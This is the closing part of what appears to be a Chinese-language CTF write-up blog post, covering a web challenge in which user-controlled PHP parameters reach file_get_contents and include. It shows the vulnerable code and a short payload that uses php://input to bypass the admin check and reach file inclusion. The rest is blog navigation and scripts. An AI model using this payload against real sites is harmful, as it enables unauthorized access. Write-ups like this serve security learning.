+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">you are not admin !  </span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>
+<p>看到<code>file_get_contents</code>函数</p>
+<p><code>file_get_contents</code>读取文件内容</p>
+<p>构造出<code>file_get_contents(&quot;php://input&quot;, &quot;r&quot;)</code></p>
+<p>payload:user=php://input&amp;file=</p>
+<h1 id="持续更新中……"><a href="#持续更新中……" class="headerlink" title="持续更新中……."></a>持续更新中…….</h1>
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF论剑场-CTF-CTF论剑场wp/" rel="tag"># CTF论剑场 CTF CTF论剑场wp</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/08/记录对Metasploitable2的一次渗透过程/" rel="next" title="记录对Metasploitable2的一次渗透过程">
+                <i class="fa fa-chevron-left"></i> 记录对Metasploitable2的一次渗透过程
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/05/14/Mysql学习笔记/" rel="prev" title="Mysql学习笔记">
+                Mysql学习笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80NzA3MC8yMzU3MA=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt>
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <div class="site-description motion-element" itemprop="description">夏天,那个夏天,还有那个夏天,即使经历无数次夏天,我还是说不出口。</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">39</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">33</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.ak6666.top/" title="http://blog.ak6666.top/" rel="noopener" target="_blank">阿凯</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=536976917&auto=1&height=32"></iframe>
+
+
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-Write-Up"><span class="nav-number">1.</span> <span class="nav-text">WEB Write Up</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-1"><span class="nav-number">1.1.</span> <span class="nav-text">WEB 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-9"><span class="nav-number">1.2.</span> <span class="nav-text">WEB 9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#流量分析"><span class="nav-number">1.3.</span> <span class="nav-text">流量分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-2"><span class="nav-number">1.4.</span> <span class="nav-text">WEB 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-5"><span class="nav-number">1.5.</span> <span class="nav-text">WEB 5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-6"><span class="nav-number">1.6.</span> <span class="nav-text">WEB 6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-11"><span class="nav-number">1.7.</span> <span class="nav-text">WEB 11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-13"><span class="nav-number">1.8.</span> <span class="nav-text">WEB 13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#日志审计"><span class="nav-number">1.9.</span> <span class="nav-text">日志审计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-18"><span class="nav-number">1.10.</span> <span class="nav-text">WEB 18</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WBE-20"><span class="nav-number">1.11.</span> <span class="nav-text">WBE 20</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-25"><span class="nav-number">1.12.</span> <span class="nav-text">WEB 25</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-3"><span class="nav-number">1.13.</span> <span class="nav-text">WEB 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-4"><span class="nav-number">1.14.</span> <span class="nav-text">WEB 4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-15"><span class="nav-number">1.15.</span> <span class="nav-text">WEB 15</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-14"><span class="nav-number">1.16.</span> <span class="nav-text">WEB 14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-21"><span class="nav-number">1.17.</span> <span class="nav-text">WEB 21</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#持续更新中……"><span class="nav-number">2.</span> <span class="nav-text">持续更新中…….</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div> 
+   
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.1</div>
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<span id="busuanzi_container_site_pv">
+    <br>本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.1"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.1"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script>
+  window.livereOptions = {
+    refer: '2019/05/12/CTF-论剑场-write-wp-持续更新/'
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
